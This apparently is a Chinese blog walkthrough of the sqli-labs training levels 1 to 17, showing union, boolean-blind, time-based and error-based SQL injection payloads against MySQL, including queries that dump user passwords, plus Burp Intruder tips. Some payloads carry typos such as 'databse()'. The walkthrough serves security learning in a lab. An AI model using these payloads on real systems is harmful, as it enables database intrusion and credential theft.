+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101037724.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101038979.png"></p>
+<p><strong>查询字段内容</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,username,password from security.users --+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101041180.png"></p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><h3 id="测试注入类型"><a href="#测试注入类型" class="headerlink" title="测试注入类型"></a>测试注入类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p>当输入字符型第一条测试语句时就出现了mysql 语法错误。说明是数字型注入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101047073.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101047095.png"></p>
+<p><strong>确认字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and order by 3 --+</span><br><span class="line">1 and order by 4 --+  显示不正常    #字段数为3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 and union select 1,2,3 --+  回显为2，3</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101052310.png"></p>
+<p>以下操作和第一关一样 唯一区别是数字型</p>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><h3 id="测试类型"><a href="#测试类型" class="headerlink" title="测试类型"></a>测试类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; and  &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现页面回显不同，存在注入</p>
+<h3 id="查看回显位置"><a href="#查看回显位置" class="headerlink" title="查看回显位置"></a>查看回显位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,3--+ </span><br></pre></td></tr></table></figure>
+
+<p>发生报错</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101100089.png"></p>
+<h3 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101101206.png"></p>
+<p>发现变量是(‘’) 这种形式 但我们上面的sql 测试语句任然生效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&#x27;$id&#x27;)</span><br><span class="line">SELECT * FROM users WHERE id=(&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;)</span><br><span class="line">SELECT * FROM users WHERE id=(&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>只闭合了单引号没有闭合括号。</p>
+<h3 id="闭合-‘’-查看回显"><a href="#闭合-‘’-查看回显" class="headerlink" title="闭合(‘’)  查看回显"></a>闭合(‘’)  查看回显</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101108345.png"></p>
+<p>以下步骤只需要闭合 然后使用之前的联合查询操作即可</p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>像之前一样测试发现没有任何回显，只能查看源码</p>
+<h3 id="源码查看-1"><a href="#源码查看-1" class="headerlink" title="源码查看"></a>源码查看</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101121271.png"></p>
+<p>发现变量id先被拼接”” 在被带入sql 语句中</p>
+<p>知道后可以进行闭合让后注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>然后基本的联合注入</p>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=1--+</span><br><span class="line">1&#x27; and 1=2--+ </span><br></pre></td></tr></table></figure>
+
+<p>页面回显不同存在注入 , 布尔盲注.</p>
+<p>条件为真时返回 you are in…..</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102119309.png"></p>
+<p>条件为假时不返回任何东西</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102121092.png"></p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101128887.png"></p>
+<p>执行sql 语句后并没有输出结果。但由于这里打印了报错信息(mysql_error)说明可以进行报错注入</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>先从数据库名方向入手。</strong></p>
+<p>1.确定数据库名的长度、(为了测试简单不进行猜测) 库名为: security</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())=7 --+ 判断数据库长度是否为7</span><br><span class="line">1&#x27; and length(database())=8 --+ 判断数据库长度是否为8</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102117759.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102118098.png"></p>
+<p>由上图可知数据库长度为8</p>
+<p>知道数据库名长度后就要去猜测数据库名</p>
+<p><strong>数据库名猜测</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and  ascii(substring( databse(),1,1))=114--+  # 正常猜解数据库名应该使用大于号小于号去猜测大概的范围，然后去确定。这里为了偷懒直接演示正确与不正确的回显</span><br><span class="line">1&#x27; and  ascii(substring(databse(),1,1))=115--+   # s=115</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102132834.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102133062.png"></p>
+<p>进行一个个猜解即可。数据库名为： security</p>
+<p><strong>表的猜测</strong></p>
+<p>1.我们需要知道security数据库下有多个表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;  and (select count(table_name) from information_schema.tables where table_schema=database()) &lt;10--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102146825.png"></p>
+<p>返回为真，表的数据少于10个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;  and (select count(table_name) from information_schema.tables where table_schema=database()) &lt;4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102151376.png"></p>
+<p>返回为假说明表的数据不少于4个</p>
+<p>查看数据库表为4个</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102153276.png"></p>
+<p><strong>表的个数确定了开始确定表名长度。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) &gt; 10 #</span><br></pre></td></tr></table></figure>
+
+<p>查询第一个表名的长度，由上图所示 长度不可能大于10所以。返回为假。然后依次类推去猜测每个表的长度</p>
+<p><strong>确定表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and  ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100--+</span><br></pre></td></tr></table></figure>
+
+<p>e的acsii码为101 所以返回为真 继续猜解直到表名为 emalis</p>
+<p>确定表中的列数个数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;emalis&#x27;)&gt;10 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403102215258.png"></p>
+<p>表中列数为2</p>
+<p><strong>获取第一个列名的长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1))&gt;2--+</span><br></pre></td></tr></table></figure>
+
+<p>猜解即可</p>
+<p>获取第一个列名的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1,1))=105--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),2,1))=100--+</span><br></pre></td></tr></table></figure>
+
+<p>列名为id</p>
+<p>第二个列名的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1,1))=101--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),2,1))=109--+</span><br></pre></td></tr></table></figure>
+
+<p>第二个列名的值为emali_id</p>
+<p><strong>知道了列名开始确认字段类容的长度</strong></p>
+<p>id 字段内容的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length((select id from emails limit 0,1) )=1--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length((select id from emails limit 1,1) )=2--+</span><br></pre></td></tr></table></figure>
+
+<p>email_id 字段类容长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length((select email_id from emails limit 0,1) )=16--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length((select email_id from emails limit 2,1) )=19--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>字段内容确认后开始获取字段内容的值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select id from emails limit 0,1),1,1))=49 --+</span><br></pre></td></tr></table></figure>
+
+<p>49对应的ascii 码为1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select email_id from emails limit 0,1),1,1))=68 --+</span><br></pre></td></tr></table></figure>
+
+<p>查询emalis 表 emali_id 字段内容的第一个值</p>
+<p><em><strong>ps:</strong></em> 以上步骤可以借助burp 进行猜解</p>
+<h3 id="借助burp盲注"><a href="#借助burp盲注" class="headerlink" title="借助burp盲注"></a>借助burp盲注</h3><p>假设数据库名和第一个表名长度已被已被猜解出来，开始猜解表名。</p>
+<p>把拦截的数据发送给intruder</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112213685.png"></p>
+<p>攻击模式选择 <strong>clusert bomb</strong> 设置两个变量</p>
+<p>第一个框是用来控制字符后移。第二个控制ascii值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112216894.png"></p>
+<p>对应的便是第一个表名 emails</p>
+<ul>
+<li>cluster bomb – 每个变量对应一个字典，并且进行交叉式破解，尝试各种组合。适用于用户名 + 密码的破解。</li>
+</ul>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112228014.png"></p>
+<p>和第四关一样在传入sql 语句时加入了 “” 号 但并不会输出数据。存在盲注和布尔注入 ，时间盲注</p>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>和上一关一样，只是闭合方式不同 回显不同而已 注释掉了报错信息。无法进行报错注入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112238351.png"></p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>这关也是布尔盲注</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112241960.png"></p>
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112247534.png"></p>
+<p>查看源码后发现他注释掉了 报错函数 和 布尔盲注(回显都是 you are in )。 那只能去尝试时间盲注</p>
+<p><strong>判断是否存在时间盲注</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112252746.png"></p>
+<p>原始响应时间为4 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(1=1,sleep(5),0)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403112256990.png"></p>
+<p>发现改变了响应时间存在时间盲注</p>
+<p><strong>判断数据库名的长度</strong></p>
+<p>数据库长度为8</p>
+<p>知道数据库的长度 开始猜解数据库的名 配合burp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((ascii(substr(database(),1,1)))=115,sleep(10),0)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403152234479.png"></p>
+<p>把payload1 从一到8 组合起来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">115=s</span><br><span class="line">101=e</span><br><span class="line">99=c</span><br><span class="line">117=u</span><br><span class="line">114=r</span><br><span class="line">105=i</span><br><span class="line">116=t</span><br><span class="line">121=y</span><br><span class="line">securit</span><br></pre></td></tr></table></figure>
+
+<p>由于是时间盲注无法根据长度判断。需要开启Response completed(<strong>响应已完成</strong>)和Response receive(<strong>已接收到响应</strong>)</p>
+<ol>
+<li>**Response received (已接收到响应)**：这表示 Burp Suite 已经收到了服务器对发送的请求的响应。这个阶段发生在服务器已经开始发送响应但还没有完全完成时。</li>
+<li>**Response completed (响应已完成)**：这表示服务器已经完全发送了响应，并且整个响应已经被接收完毕。这个阶段发生在服务器已经发送完整个响应并且 Burp Suite 已经成功接收到了所有数据。</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403152240102.png"></p>
+<p>只能看响应数比较大的几个值</p>
+<p>猜解表和字段也是类似的操作</p>
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403152247852.png"></p>
+<p>这关也是时间盲注 只需要闭合“ 即可</p>
+<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161634302.png"></p>
+<p>请求方式为post，注入方式还是存在</p>
+<h3 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161648095.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">or： 一边为真 条件为真。</span><br><span class="line"></span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;# 显示正常</span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;2&#x27;# 不显示</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161650668.png"></p>
+<p><strong>判断字段数</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161652147.png"></p>
+<p>表的字段数为2</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161703614.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161703836.png"></p>
+<p>查询当前库的表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; union select 1,group_concat(table_name) from information_schema.tables        where table_schema=database()  #&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161704810.png"></p>
+<p>和之前的联合注入一样</p>
+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161710152.png"></p>
+<p>post 注入 闭合 变量执行sql 语句前 添加了**”**  闭合 ”）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot;) or &quot;1&quot;=&quot;1&quot;#&amp;passwd&amp;submit=Submit </span><br><span class="line">uname=2&quot;) or &quot;1&quot;=&quot;1&quot;#&amp;passwd&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161728513.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161728678.png"></p>
+<p>和11关一样</p>
+<h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161730343.png"></p>
+<p>注释了 很多东西 闭合**’)**</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161733260.png"></p>
+<p>打印了报错信息可以使用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">报错注入使用extractvalue函数 updatexml函数</span><br></pre></td></tr></table></figure>
+
+<p>查看当前数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;) or extractvalue(1,concat(0x7e,(select database())))#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>查看表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;) or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>注：此处使用group_concat（）函数进行输出，否则会出现错误。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161810415.png"></p>
+<p>查看users 表的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;) or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database())))#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161817160.png"></p>
+<p>查看字段内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;) or extractvalue(1,(select group_concat(id,0x7e,username,0x7e,password) from security.users))#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403161824475.png"></p>
+<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172112680.png"></p>
+<p>根据源码需要闭合**”** 报错注入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172113564.png"></p>
+<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172116603.png"></p>
+<p>需要闭合**’**,打印报错信息也被注释掉了，时间盲注 布尔盲注</p>
+<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172145557.png"></p>
+<p>和15关一样 时间盲注和布尔注入</p>
+<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172304565.png"></p>
+<p>先分析源码 用post 接受 unmae passwd 变量的值。然后把name 值带入到了 check_input函数中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172305427.png"></p>
+<p>这个函数 先判断是否为空值，若不为空值开始使用substr 函数从0到15截取值。然后在用get_magic_quotes_gpc ，是否开启magic_quotes_gpc(<strong>magic_quotes_gpc是配置在php.ini中的，他的作用类似addslashes()，就是对输入的字符创中的字符进行转义处理</strong>)。有的话就用 stripslashes 函数去掉转义符,否侧会发生双重转义。第三判断检测用户是否有数字，如果没有就使用mysql_real_escape_string() 函数转义字符。反之把值转为整形。</p>
+<p>可以看出是个 过滤函数</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172326878.png"></p>
+<p>然后执行了一条sql语句，从users 表中查询 username,password 字段的内容 条件username 要等于数据库中的用户名。正常来说这应该是sql 注入漏洞。但由于username 变量的值 被转义处理过了。 username 中不存在sql 注入。</p>
+<p>再往下看，他sql 语句执行成功后， 使用了更新语句去重新设置了password 的值 ，条件是存在的用户名。说明是个密码重置功能。然后这个password 并没有进行转义。下面的代码中还打印了mysql 报错信息。使用报错注入。</p>
+<h3 id="password-字段报错注入"><a href="#password-字段报错注入" class="headerlink" title="password 字段报错注入"></a>password 字段报错注入</h3><p>admin 用户是存在的。使用这个进行报错注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27;and extractvalue(1,concat(0x7e,(database()),0x7e))#3&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
